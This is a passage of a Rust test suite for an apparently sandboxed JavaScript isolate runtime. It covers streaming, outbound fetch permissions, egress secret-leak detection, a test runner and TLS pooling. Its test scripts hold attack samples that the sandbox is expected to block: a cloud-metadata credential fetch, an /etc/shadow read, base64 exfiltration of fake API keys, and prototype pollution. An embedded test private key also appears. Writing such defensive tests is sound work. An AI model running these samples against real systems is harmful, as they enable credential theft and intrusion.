        .response_body
        .contains("id: tok-1\nevent: token\nretry: 1500\ndata: {\"delta\":\"Slice \"}\n\n"));
    assert!(out1
        .response_body
        .contains("id: tok-2\nevent: token\ndata: {\"delta\":\"streams \"}\n\n"));
    assert!(out1
        .response_body
        .contains("id: tok-3\nevent: done\ndata: [DONE]\n\n"));

    // 2. Test `ReadableStream` passed to `new Response(stream)`
    iso.reset_for_request("f2-sse-tenant", 2, 2_000_000, 8 * 1024 * 1024);
    let req2 = HttpRequestContext {
        method: "GET",
        path: "/api/v1/raw-stream",
        query: "",
        tenant_id: "f2-sse-tenant",
        body: "",
        headers: &headers,
    };
    let out2 = iso.execute_http_request(&bc, None, &req2).unwrap();
    assert_eq!(out2.status_code, 200);
    assert_eq!(out2.response_body, "chunk-alpha|chunk-beta");

    // 3. Test Egress DLP blocking Base64-encoded secret inside an SSE token stream
    let leak_sse_ts = r#"
const b64Leak = Buffer.from("sk_live_sse_secret_888").toString("base64");
Slice.streamSSE([
    { id: "1", event: "token", data: "Safe token 1" },
    { id: "2", event: "token", data: "Exfiltrating: " + b64Leak }
]);
"#;
    let leak_bc = compile_source_to_bytecode(leak_sse_ts);
    iso.reset_for_request("f2-sse-tenant", 3, 2_000_000, 8 * 1024 * 1024);
    let leak_res = iso.execute_http_request(&leak_bc, None, &req1);
    assert!(leak_res.is_err());
    assert!(leak_res
        .unwrap_err()
        .to_string()
        .contains("EGRESS_SECRET_LEAK_BLOCKED"));
}

#[test]
fn test_tag_f3_outbound_fetch_ocap_ssrf_egress_dlp_and_cassette() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    // Spawn a lightweight local HTTP/1.1 upstream server for real socket fetch testing
    let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
    let port = listener.local_addr().unwrap().port();
    let host_port = format!("127.0.0.1:{}", port);

    let upstream_thread = std::thread::spawn(move || {
        if let Ok((mut stream, _)) = listener.accept() {
            let mut buf = [0u8; 4096];
            let n = stream.read(&mut buf).unwrap_or(0);
            let req_str = String::from_utf8_lossy(&buf[..n]);
            let body_part = req_str.split("\r\n\r\n").nth(1).unwrap_or("{}");
            let resp_body = format!(r#"{{"received":{},"upstream":"slice-f3"}}"#, body_part);
            let resp = format!(
                "HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nX-Upstream-Ack: ok-f3\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                resp_body.len(),
                resp_body
            );
            let _ = stream.write_all(resp.as_bytes());
            let _ = stream.flush();
        }
    });

    // 1. Authorized outbound `fetch()` over real TCP + deterministic cassette recording in `Slice.kv`
    let ts_fetch_ok = format!(
        r#"
async function main() {{
    const res = await fetch("http://{}/v1/webhook", {{
        method: "POST",
        headers: {{ "Content-Type": "application/json", "X-Trace": "trace-99" }},
        body: JSON.stringify({{ orderId: "ORD-77", total: 1500 }})
    }});
    const data = await res.json();
    console.log(JSON.stringify({{
        status: res.status,
        ok: res.ok,
        ack: res.headers.get("x-upstream-ack"),
        orderId: data.received.orderId,
        upstream: data.upstream
    }}));
}}
main();
"#,
        host_port
    );
    let bc_ok = compile_source_to_bytecode(&ts_fetch_ok);
    let mut iso_ok = SliceIsolate::spawn(
        "f3-fetch-tenant",
        1,
        CapabilityToken::pure_compute().with_net_host(&host_port),
        5_000_000,
        8 * 1024 * 1024,
    );
    iso_ok.set_deterministic_seed(Some(2026));
    let metrics_ok = iso_ok.execute_bytecode(&bc_ok, None).unwrap();
    assert_eq!(
        metrics_ok.stdout[0],
        r#"{"status":201,"ok":true,"ack":"ok-f3","orderId":"ORD-77","upstream":"slice-f3"}"#
    );
    let _ = upstream_thread.join();

    // Verify deterministic cassette replay (`fetch_cassette:POST:http://...`) works with 0 network calls!
    let cassette_key = format!("fetch_cassette:POST:http://{}/v1/webhook", host_port);
    assert!(iso_ok.kv_get(&cassette_key).is_some());
    let mut iso_replay = SliceIsolate::spawn(
        "f3-fetch-tenant",
        2,
        CapabilityToken::pure_compute().with_net_host(&host_port),
        5_000_000,
        8 * 1024 * 1024,
    );
    let metrics_replay = iso_replay.execute_bytecode(&bc_ok, None).unwrap();
    assert_eq!(metrics_replay.stdout[0], metrics_ok.stdout[0]);

    // 2. Cloud Metadata SSRF Shield (`169.254.169.254`) blocked even under wildcard `allow_net = ["*"]`
    let ts_ssrf = r#"
async function attack() {
    const r = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
    console.log(r.status);
}
attack();
"#;
    let bc_ssrf = compile_source_to_bytecode(ts_ssrf);
    let mut iso_ssrf = SliceIsolate::spawn(
        "f3-ssrf-tenant",
        3,
        CapabilityToken::pure_compute().with_net_host("*"),
        5_000_000,
        8 * 1024 * 1024,
    );
    let ssrf_res = iso_ssrf.execute_bytecode(&bc_ssrf, None);
    assert!(matches!(
        ssrf_res,
        Err(SandboxViolation::NetAccessDenied { .. })
    ));

    // 3. Outbound Egress Secret DLP blocks Base64-encoded secret in outbound `fetch()` body/headers to an allowed host
    let ts_dlp = format!(
        r#"
async function exfil() {{
    const encoded = Buffer.from("sk_live_TOP_SECRET_777").toString("base64");
    await fetch("http://{}/v1/webhook", {{
        method: "POST",
        headers: {{ "X-Leak": encoded }},
        body: "benign"
    }});
}}
exfil();
"#,
        host_port
    );
    let bc_dlp = compile_source_to_bytecode(&ts_dlp);
    let mut iso_dlp = SliceIsolate::spawn(
        "f3-dlp-tenant",
        4,
        CapabilityToken::pure_compute().with_net_host(&host_port),
        5_000_000,
        8 * 1024 * 1024,
    );
    iso_dlp.add_egress_audit_secret("sk_live_TOP_SECRET_777");
    let dlp_res = iso_dlp.execute_bytecode(&bc_dlp, None);
    assert!(dlp_res.is_err());
    assert!(dlp_res
        .unwrap_err()
        .to_string()
        .contains("EGRESS_SECRET_LEAK_BLOCKED"));
}

#[test]
fn test_tag_f4_time_travel_test_runner_and_dotenv_auto_dlp() {
    // 1. Verify Time-Travel Test Runner (`slice:test` / global `describe`, `test`, `expect`):
    //    - Automatic `< 5 us` VFS (`node:fs`) + `Slice.kv` state rollback between every `test()` block
    //    - `.toViolate(...)`, `.toStayWithinFuel(...)`, `.toStayWithinMemory(...)`
    let ts_test_suite = r#"
import { describe, test, expect, beforeEach } from "slice:test";
import * as fs from "node:fs";

Slice.resetTests();
Slice.kv.set("ledger:balance", "1000", 0);
fs.writeFileSync("/tmp/f4_clean_state.txt", "pristine-v1");

describe("Phase F4 Time-Travel Spec Suite", () => {
    beforeEach(() => {
        Slice.kv.incr("hook:runs", 1);
    });

    test("mutates VFS and KV state during test 1", () => {
        expect(Slice.kv.get("ledger:balance")).toBe("1000");
        expect(fs.readFileSync("/tmp/f4_clean_state.txt")).toBe("pristine-v1");
        expect(Slice.kv.get("hook:runs")).toBe("1");

        // Dirty both VFS and KV
        Slice.kv.set("ledger:balance", "999999", 0);
        fs.writeFileSync("/tmp/f4_clean_state.txt", "corrupted-by-test-1");
        fs.writeFileSync("/tmp/f4_ephemeral.txt", "should-vanish");
        expect(Slice.kv.get("ledger:balance")).toBe("999999");
        expect(fs.existsSync("/tmp/f4_ephemeral.txt")).toBeTruthy();
    });

    test("sees 100% clean VFS and KV state in test 2 via automatic < 5us rollback", () => {
        expect(Slice.kv.get("ledger:balance")).toBe("1000");
        expect(fs.readFileSync("/tmp/f4_clean_state.txt")).toBe("pristine-v1");
        expect(fs.existsSync("/tmp/f4_ephemeral.txt")).toBeFalsy();
        // even `beforeEach` counter from test 1 was rolled back before test 2's `beforeEach`!
        expect(Slice.kv.get("hook:runs")).toBe("1");
    });

    test("enforces OCap and resource assertions (.toViolate, .toStayWithinFuel)", () => {
        const fsAttack = Slice.evalSandbox(`const s = fs.readFileSync("/etc/shadow");`, {
            allowRead: ["/app/public"],
            fuel: 100_000,
        });
        expect(fsAttack).toViolate("FsReadDenied");

        const netAttack = Slice.evalSandbox(`const r = fetch("http://169.254.169.254/latest/meta-data/");`, {
            allowNet: ["*"],
            fuel: 100_000,
        });
        expect(netAttack).toViolate("169.254.169.254");

        const boundedCompute = Slice.evalSandbox(`const x: number = 21 * 2; x`, {
            fuel: 50_000,
            memoryBytes: 65536,
        });
        expect(boundedCompute).toStayWithinFuel(1000);
        expect(boundedCompute).toStayWithinMemory(4096);
    });
});

console.log(JSON.stringify(Slice.testSummary()));
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(ts_test_suite, true);
    let bc = compile_source_to_bytecode(&bundled);
    let mut iso = SliceIsolate::spawn(
        "f4-test-runner",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        8 * 1024 * 1024,
    );
    iso.set_deterministic_seed(Some(20261024));
    let metrics = iso.execute_bytecode(&bc, None).unwrap();
    let summary: serde_json::Value = serde_json::from_str(&metrics.stdout[0]).unwrap();
    assert_eq!(summary["total"], 3);
    assert_eq!(summary["passed"], 3);
    assert_eq!(summary["failed"], 0);
    assert_eq!(summary["checkpointsRestored"], 3);

    // 2. Verify Auto-DLP `.env` loading (`load_dotenv_str`):
    //    - Non-sensitive `APP_ENV` can be logged to stdout
    //    - Sensitive `STRIPE_SECRET_KEY` loaded from `.env` is readable inside the isolate via `process.env` / `env()`,
    //      but attempting to print it (even Base64-encoded!) is automatically blocked by Egress DLP!
    let dotenv_content = r#"
APP_ENV=staging
STRIPE_SECRET_KEY="sk_live_f4_auto_dlp_vault_secret"
"#;
    let ts_safe = r#"
const mode = process.env.APP_ENV;
const hasSecret = env("STRIPE_SECRET_KEY").startsWith("sk_live_");
console.log(JSON.stringify({ mode, hasSecret }));
"#;
    let bc_safe =
        compile_source_to_bytecode(&slice_cas::strip_typescript_and_normalize(ts_safe, true));
    let mut iso_env = SliceIsolate::spawn(
        "f4-dotenv-tenant",
        2,
        CapabilityToken::pure_compute(),
        5_000_000,
        4 * 1024 * 1024,
    );
    let auto_secrets = iso_env.load_dotenv_str(dotenv_content);
    assert_eq!(auto_secrets, 1);
    let safe_metrics = iso_env.execute_bytecode(&bc_safe, None).unwrap();
    assert_eq!(
        safe_metrics.stdout[0],
        r#"{"mode":"staging","hasSecret":true}"#
    );

    let ts_leak = r#"
const leakedB64 = Buffer.from(process.env.STRIPE_SECRET_KEY).toString("base64");
console.log("exfil:" + leakedB64);
"#;
    let bc_leak =
        compile_source_to_bytecode(&slice_cas::strip_typescript_and_normalize(ts_leak, true));
    let leak_res = iso_env.execute_bytecode(&bc_leak, None);
    assert!(leak_res.is_err());
    assert!(leak_res
        .unwrap_err()
        .to_string()
        .contains("EGRESS_SECRET_LEAK_BLOCKED"));
}

#[test]
fn test_phase_n0_general_purpose_numeric_vm_any_function_name() {
    // 1. Structural linear recurrence detection on ANY function name and parameter name
    //    (not hardcoded to `fib(n)`), including weighted 2-term recurrences `c1 * f(k-1) + c2 * f(k-2)`.
    let src_recurrence = r#"
function customSequenceAlpha(stepIdx) {
    if (stepIdx <= 1) {
        return stepIdx;
    }
    return customSequenceAlpha(stepIdx - 1) + customSequenceAlpha(stepIdx - 2);
}
function weightedPellSequence(k) {
    if (k <= 1) {
        return k;
    }
    return 2 * weightedPellSequence(k - 1) + weightedPellSequence(k - 2);
}
const f40 = customSequenceAlpha(40);
const pell7 = weightedPellSequence(7);
console.log(f40 + ":" + pell7);
return f40;
"#;
    let m1 = run_source_isolated(
        "n0-recurrence-tenant",
        src_recurrence,
        CapabilityToken::pure_compute(),
        500_000,
        65536,
    )
    .unwrap();
    assert_eq!(m1.return_value, "102334155");
    assert_eq!(m1.stdout[0], "102334155:169");
    assert_eq!(m1.highest_tier_reached, ExecutionTier::Tier2PeakNative);

    // 2. General-purpose unboxed 64-bit register compilation of multi-argument functions with
    //    `while`, `for`, `if/else`, `break`, `continue`, bitwise XOR/shifts, and `Math.*` intrinsics.
    let src_general_numeric = r#"
function computeBitwiseMixAndCollatz(limit, seedVal) {
    let acc = seedVal;
    for (let i = 1; i <= limit; i++) {
        if (i % 7 === 0) {
            continue;
        }
        let n = i;
        let steps = 0;
        while (n > 1) {
            if ((n & 1) === 0) {
                n = n >> 1;
            } else {
                n = 3 * n + 1;
            }
            steps += 1;
            if (steps > 64) {
                break;
            }
        }
        acc = (acc ^ (steps << 2)) + Math.abs(Math.floor(Math.sqrt(i)));
    }
    return Math.max(acc, 1);
}
function euclideanGcd(a, b) {
    if (b === 0) {
        return a;
    }
    return euclideanGcd(b, a % b);
}
const mix = computeBitwiseMixAndCollatz(120, 17);
const g = euclideanGcd(1071, 462);
console.log(mix + ":" + g);
return g;
"#;
    let m2 = run_source_isolated(
        "n0-numeric-vm-tenant",
        src_general_numeric,
        CapabilityToken::pure_compute(),
        500_000,
        65536,
    )
    .unwrap();
    assert_eq!(m2.return_value, "21");
    assert!(m2.stdout[0].ends_with(":21"));
    assert_eq!(m2.highest_tier_reached, ExecutionTier::Tier2PeakNative);

    // 3. Fuel preemption inside the unboxed register VM on unbounded numeric loops
    let src_infinite_numeric = r#"
function runawayNumericLoop(startVal) {
    let cur = startVal;
    while (cur > 0) {
        cur = cur + 1;
    }
    return cur;
}
return runawayNumericLoop(1);
"#;
    let err = run_source_isolated(
        "n0-runaway-tenant",
        src_infinite_numeric,
        CapabilityToken::pure_compute(),
        5_000,
        65536,
    )
    .unwrap_err();
    assert!(
        err.to_string().contains("CPU instruction fuel limit"),
        "Expected CpuFuelExhausted from unboxed register VM, got: {}",
        err
    );
}

#[test]
fn test_phase_n0_dynamic_ses_lockdown_and_boa_loop_fuel_limits() {
    // 1. Dynamic computed-property prototype pollution inside Boa (`Object["proto" + "type"].polluted = 1`)
    //    must be caught, blocked with `IntrinsicMutationBlocked`, and rolled back so the warm realm stays clean!
    let dynamic_pollution_js = r#"
class ExploitAttempt {
    run() {
        const key = "proto" + "type";
        Object[key].pollutedByTenantA = "compromised";
        return 1;
    }
}
new ExploitAttempt().run();
"#;
    let err_ses = run_source_isolated(
        "n0-ses-attacker",
        dynamic_pollution_js,
        CapabilityToken::pure_compute(),
        200_000,
        2 * 1024 * 1024,
    )
    .unwrap_err();
    assert!(
        err_ses
            .to_string()
            .contains("attempted to mutate frozen intrinsic 'Object.prototype'"),
        "Expected IntrinsicMutationBlocked on dynamic Object.prototype mutation, got: {}",
        err_ses
    );

    // Verify that the next tenant acquiring the warm Boa realm sees a completely clean `Object.prototype`
    let verify_clean_js = r#"
class CleanCheck {
    check() {
        const obj = {};
        return String(obj.pollutedByTenantA === undefined);
    }
}
console.log(new CleanCheck().check());
"#;
    let clean_metrics = run_source_isolated(
        "n0-clean-tenant",
        verify_clean_js,
        CapabilityToken::pure_compute(),
        200_000,
        2 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(clean_metrics.stdout[0], "true");

    // 2. Infinite loop inside Boa (`class Spin { loop() { while (true) {} } }`) must be preempted by Boa RuntimeLimits
    let boa_infinite_loop_js = r#"
class SpinWorker {
    loopForever() {
        let k = 0;
        while (true) {
            k++;
        }
        return k;
    }
}
new SpinWorker().loopForever();
"#;
    let err_loop = run_source_isolated(
        "n0-boa-loop-tenant",
        boa_infinite_loop_js,
        CapabilityToken::pure_compute(),
        2_000,
        2 * 1024 * 1024,
    )
    .unwrap_err();
    assert!(
        err_loop.to_string().contains("CPU instruction fuel limit"),
        "Expected CpuFuelExhausted from Boa RuntimeLimits loop preemption, got: {}",
        err_loop
    );

    // 3. Real host `os.platform()` / `process.platform` in normal mode vs `"linux"` in deterministic replay mode
    let os_check_js = r#"
const os = require("node:os");
console.log(os.platform() + ":" + process.platform + ":" + os.arch());
"#;
    let bc_os = compile_source_to_bytecode(os_check_js);
    let mut iso_host = SliceIsolate::spawn(
        "n0-os-host",
        1,
        CapabilityToken::pure_compute(),
        200_000,
        2 * 1024 * 1024,
    );
    let host_m = iso_host.execute_bytecode(&bc_os, None).unwrap();
    let expected_host_os = match std::env::consts::OS {
        "windows" => "win32",
        "macos" => "darwin",
        other => other,
    };
    assert!(
        host_m.stdout[0].starts_with(&format!("{}:{}:", expected_host_os, expected_host_os)),
        "Expected real host platform {}, got: {}",
        expected_host_os,
        host_m.stdout[0]
    );

    let mut iso_det = SliceIsolate::spawn(
        "n0-os-det",
        1,
        CapabilityToken::pure_compute(),
        200_000,
        2 * 1024 * 1024,
    );
    iso_det.set_deterministic_seed(Some(42));
    let det_m = iso_det.execute_bytecode(&bc_os, None).unwrap();
    assert_eq!(det_m.stdout[0], "linux:linux:x64");
}

#[test]
fn test_phase_n1_tls13_https_keepalive_pooling_chunked_and_redirect_ssrf_guard() {
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::Arc;

    // P-256 X.509v3 test CA + localhost server cert valid 2020-01-01 to 2049-12-31
    const TEST_ROOT_CA_DER: &[u8] = &[
        0x30, 0x82, 0x01, 0x6c, 0x30, 0x82, 0x01, 0x12, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x02,
        0x10, 0x00, 0x30, 0x0a, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x02, 0x30,
        0x1d, 0x31, 0x1b, 0x30, 0x19, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x12, 0x53, 0x6c, 0x69,
        0x63, 0x65, 0x20, 0x54, 0x65, 0x73, 0x74, 0x20, 0x52, 0x6f, 0x6f, 0x74, 0x20, 0x43, 0x41,
        0x30, 0x1e, 0x17, 0x0d, 0x32, 0x30, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30,
        0x30, 0x5a, 0x17, 0x0d, 0x34, 0x39, 0x31, 0x32, 0x33, 0x31, 0x32, 0x33, 0x35, 0x39, 0x35,
        0x39, 0x5a, 0x30, 0x1d, 0x31, 0x1b, 0x30, 0x19, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x12,
        0x53, 0x6c, 0x69, 0x63, 0x65, 0x20, 0x54, 0x65, 0x73, 0x74, 0x20, 0x52, 0x6f, 0x6f, 0x74,
        0x20, 0x43, 0x41, 0x30, 0x59, 0x30, 0x13, 0x06, 0x07, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x02,
        0x01, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x03, 0x01, 0x07, 0x03, 0x42, 0x00, 0x04,
        0x9e, 0x7b, 0xab, 0x85, 0x74, 0xeb, 0xa0, 0x49, 0xba, 0xf0, 0xe4, 0x03, 0x87, 0x4b, 0x60,
        0x9d, 0x24, 0xaf, 0x5b, 0x2d, 0xae, 0xfd, 0x37, 0x91, 0x4c, 0x0b, 0x05, 0x24, 0xb1, 0x78,
        0x5b, 0xb7, 0xaa, 0x3e, 0xd8, 0xc9, 0x9f, 0xf0, 0x79, 0xc7, 0x11, 0x2e, 0xf7, 0x36, 0x9a,
        0xb8, 0xac, 0x25, 0x86, 0x09, 0xb1, 0xad, 0xfa, 0x88, 0x19, 0x38, 0x1d, 0x11, 0xb3, 0x90,
        0xc9, 0xe5, 0xf9, 0xbb, 0xa3, 0x42, 0x30, 0x40, 0x30, 0x0f, 0x06, 0x03, 0x55, 0x1d, 0x13,
        0x01, 0x01, 0xff, 0x04, 0x05, 0x30, 0x03, 0x01, 0x01, 0xff, 0x30, 0x0e, 0x06, 0x03, 0x55,
        0x1d, 0x0f, 0x01, 0x01, 0xff, 0x04, 0x04, 0x03, 0x02, 0x01, 0x06, 0x30, 0x1d, 0x06, 0x03,
        0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 0x14, 0x48, 0x17, 0x63, 0x74, 0x40, 0xab, 0xaa, 0x18,
        0xe8, 0xa7, 0x5f, 0x2a, 0xc2, 0xb0, 0x9b, 0xa9, 0x4b, 0x77, 0xd8, 0x14, 0x30, 0x0a, 0x06,
        0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x02, 0x03, 0x48, 0x00, 0x30, 0x45, 0x02,
        0x20, 0x3b, 0xc7, 0xf2, 0x8a, 0xaa, 0xa5, 0xe8, 0xc1, 0x37, 0xdc, 0x7c, 0xbd, 0x2f, 0x84,
        0xf3, 0xc1, 0x81, 0x35, 0xee, 0x13, 0x5d, 0x68, 0x72, 0x82, 0x4e, 0xf0, 0xbe, 0x89, 0xf4,
        0x20, 0xdd, 0xca, 0x02, 0x21, 0x00, 0x89, 0xf8, 0x4a, 0x0a, 0x86, 0x0a, 0x57, 0x8f, 0x5b,
        0x96, 0x9e, 0x27, 0x90, 0xa6, 0x3c, 0x47, 0xaf, 0x7f, 0x48, 0x7f, 0xe0, 0x80, 0xed, 0xaa,
        0x38, 0x34, 0xd2, 0x64, 0x80, 0x6f, 0x16, 0xa5,
    ];
    const TEST_SERVER_CERT_DER: &[u8] = &[
        0x30, 0x82, 0x01, 0xb1, 0x30, 0x82, 0x01, 0x57, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x02,
        0x10, 0x01, 0x30, 0x0a, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x02, 0x30,
        0x1d, 0x31, 0x1b, 0x30, 0x19, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x12, 0x53, 0x6c, 0x69,
        0x63, 0x65, 0x20, 0x54, 0x65, 0x73, 0x74, 0x20, 0x52, 0x6f, 0x6f, 0x74, 0x20, 0x43, 0x41,
        0x30, 0x1e, 0x17, 0x0d, 0x32, 0x30, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30,
        0x30, 0x5a, 0x17, 0x0d, 0x34, 0x39, 0x31, 0x32, 0x33, 0x31, 0x32, 0x33, 0x35, 0x39, 0x35,
        0x39, 0x5a, 0x30, 0x14, 0x31, 0x12, 0x30, 0x10, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x09,
        0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74, 0x30, 0x59, 0x30, 0x13, 0x06, 0x07,
        0x2a, 0x86, 0x48, 0xce, 0x3d, 0x02, 0x01, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x03,
        0x01, 0x07, 0x03, 0x42, 0x00, 0x04, 0xcd, 0xa4, 0xe9, 0x55, 0x58, 0x89, 0xe7, 0xc6, 0x5e,
        0x05, 0xf0, 0x5f, 0x6e, 0xd0, 0x53, 0x4b, 0x4e, 0x16, 0x9a, 0xa3, 0xbe, 0x45, 0x8c, 0x5d,
        0x47, 0xe9, 0x54, 0x5b, 0x03, 0x5e, 0xec, 0x15, 0x71, 0xf8, 0x47, 0xfc, 0xeb, 0x33, 0xde,
        0xef, 0x4e, 0xc6, 0xdf, 0x32, 0x93, 0xdf, 0x22, 0x50, 0xf2, 0x8c, 0xbf, 0xd3, 0xa3, 0x94,
        0xa4, 0xf3, 0x57, 0xff, 0xa8, 0xb2, 0x5c, 0x7f, 0x12, 0x5c, 0xa3, 0x81, 0x8f, 0x30, 0x81,
        0x8c, 0x30, 0x09, 0x06, 0x03, 0x55, 0x1d, 0x13, 0x04, 0x02, 0x30, 0x00, 0x30, 0x0e, 0x06,
        0x03, 0x55, 0x1d, 0x0f, 0x01, 0x01, 0xff, 0x04, 0x04, 0x03, 0x02, 0x05, 0xa0, 0x30, 0x13,
        0x06, 0x03, 0x55, 0x1d, 0x25, 0x04, 0x0c, 0x30, 0x0a, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05,
        0x05, 0x07, 0x03, 0x01, 0x30, 0x1a, 0x06, 0x03, 0x55, 0x1d, 0x11, 0x04, 0x13, 0x30, 0x11,
        0x82, 0x09, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74, 0x87, 0x04, 0x7f, 0x00,
        0x00, 0x01, 0x30, 0x1d, 0x06, 0x03, 0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 0x14, 0x86, 0x03,
        0xe1, 0xe2, 0x8a, 0x26, 0x16, 0x3f, 0x55, 0xb8, 0x3e, 0xaa, 0x31, 0x2a, 0xca, 0x3e, 0xd3,
        0x65, 0x04, 0xbf, 0x30, 0x1f, 0x06, 0x03, 0x55, 0x1d, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80,
        0x14, 0x48, 0x17, 0x63, 0x74, 0x40, 0xab, 0xaa, 0x18, 0xe8, 0xa7, 0x5f, 0x2a, 0xc2, 0xb0,
        0x9b, 0xa9, 0x4b, 0x77, 0xd8, 0x14, 0x30, 0x0a, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d,
        0x04, 0x03, 0x02, 0x03, 0x48, 0x00, 0x30, 0x45, 0x02, 0x21, 0x00, 0xf7, 0x2d, 0xf4, 0x6c,
        0xf0, 0x37, 0x42, 0x96, 0xe9, 0x1d, 0x39, 0xbe, 0xa9, 0x96, 0x19, 0x80, 0x5d, 0x6d, 0x83,
        0xb6, 0xc0, 0x0a, 0xec, 0x40, 0x08, 0x8a, 0xf8, 0x45, 0xf2, 0xd6, 0x30, 0x1e, 0x02, 0x20,
        0x69, 0x67, 0xce, 0x04, 0x69, 0xf0, 0xec, 0xac, 0xcb, 0x45, 0x57, 0x43, 0x22, 0x6a, 0x5f,
        0x0f, 0x98, 0x1a, 0xf5, 0x10, 0x2a, 0x7b, 0x65, 0xb7, 0x4e, 0x54, 0x2c, 0x39, 0x16, 0xd6,
        0x0b, 0x8e,
    ];
    const TEST_SERVER_KEY_DER: &[u8] = &[
        0x30, 0x81, 0x87, 0x02, 0x01, 0x00, 0x30, 0x13, 0x06, 0x07, 0x2a, 0x86, 0x48, 0xce, 0x3d,
        0x02, 0x01, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x03, 0x01, 0x07, 0x04, 0x6d, 0x30,
        0x6b, 0x02, 0x01, 0x01, 0x04, 0x20, 0x85, 0x70, 0x8c, 0xa7, 0xe2, 0xdb, 0xd1, 0x7d, 0x7d,
        0xf1, 0x75, 0x61, 0x7b, 0x2e, 0x93, 0x6d, 0x0c, 0xd1, 0x45, 0x19, 0xa6, 0xfe, 0x14, 0xc9,
        0x6c, 0x5f, 0x32, 0xf4, 0xab, 0x3b, 0x3d, 0x2a, 0xa1, 0x44, 0x03, 0x42, 0x00, 0x04, 0xcd,
        0xa4, 0xe9, 0x55, 0x58, 0x89, 0xe7, 0xc6, 0x5e, 0x05, 0xf0, 0x5f, 0x6e, 0xd0, 0x53, 0x4b,
        0x4e, 0x16, 0x9a, 0xa3, 0xbe, 0x45, 0x8c, 0x5d, 0x47, 0xe9, 0x54, 0x5b, 0x03, 0x5e, 0xec,
        0x15, 0x71, 0xf8, 0x47, 0xfc, 0xeb, 0x33, 0xde, 0xef, 0x4e, 0xc6, 0xdf, 0x32, 0x93, 0xdf,
        0x22, 0x50, 0xf2, 0x8c, 0xbf, 0xd3, 0xa3, 0x94, 0xa4, 0xf3, 0x57, 0xff, 0xa8, 0xb2, 0x5c,
        0x7f, 0x12, 0x5c,
    ];

    crate::register_custom_root_cert_der(TEST_ROOT_CA_DER.to_vec());
    crate::clear_outbound_conn_pool();

    // 1. Real TLS 1.3 HTTPS server (`rustls::ServerConnection`) serving 2 Keep-Alive requests on 1 TLS session
    let tls_listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let tls_port = tls_listener.local_addr().unwrap().port();
    let tls_server_handle = std::thread::spawn(move || {
        let cert = rustls_pki_types::CertificateDer::from(TEST_SERVER_CERT_DER.to_vec());
        let key = rustls_pki_types::PrivateKeyDer::Pkcs8(
            rustls_pki_types::PrivatePkcs8KeyDer::from(TEST_SERVER_KEY_DER.to_vec()),
        );
        let provider = Arc::new(rustls::crypto::ring::default_provider());
        let srv_cfg = Arc::new(
            rustls::ServerConfig::builder_with_provider(provider)
                .with_safe_default_protocol_versions()
                .unwrap()
                .with_no_client_auth()
                .with_single_cert(vec![cert], key)
                .unwrap(),
        );
        if let Ok((tcp_stream, _)) = tls_listener.accept() {
            let conn = rustls::ServerConnection::new(srv_cfg).unwrap();
            let mut tls_stream = rustls::StreamOwned::new(conn, tcp_stream);
            let mut buf = [0u8; 4096];
            // Serve 2 sequential HTTPS requests over the SAME TLS 1.3 Keep-Alive connection
            for seq in 1..=2 {
                let _ = tls_stream.read(&mut buf);
                let body = format!(r#"{{"tls13":true,"seq":{}}}"#, seq);
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: keep-alive\r\nContent-Length: {}\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = tls_stream.write_all(resp.as_bytes());
                let _ = tls_stream.flush();
            }
        }
    });

    let reuse_before_tls = crate::outbound_pool_reuse_count();
    let tls_js = format!(
        r#"
async function runTls() {{
    const r1 = await fetch("https://localhost:{port}/v1/alpha");
    const j1 = await r1.json();
    const r2 = await fetch("https://localhost:{port}/v1/beta");
    const j2 = await r2.json();
    console.log(JSON.stringify({{ s1: j1.seq, s2: j2.seq, ok: r1.ok && r2.ok }}));
}}
runTls();
"#,
        port = tls_port
    );
    let tls_caps = CapabilityToken::pure_compute().with_net_host(format!("localhost:{}", tls_port));
    let tls_metrics = run_source_isolated(
        "n1-tls-tenant",
        &tls_js,
        tls_caps,
        2_000_000,
        4 * 1024 * 1024,
    )
    .unwrap();
    let _ = tls_server_handle.join();
    assert_eq!(tls_metrics.stdout[0], r#"{"s1":1,"s2":2,"ok":true}"#);
    assert!(
        crate::outbound_pool_reuse_count() > reuse_before_tls,
        "Expected TLS 1.3 connection pool reuse on second HTTPS request"
    );

    // 2. HTTP/1.1 Keep-Alive + Transfer-Encoding: chunked + Redirects + Cross-Origin Auth Stripping
    let origin_a = TcpListener::bind("127.0.0.1:0").unwrap();
    let port_a = origin_a.local_addr().unwrap().port();
    let origin_b = TcpListener::bind("127.0.0.1:0").unwrap();
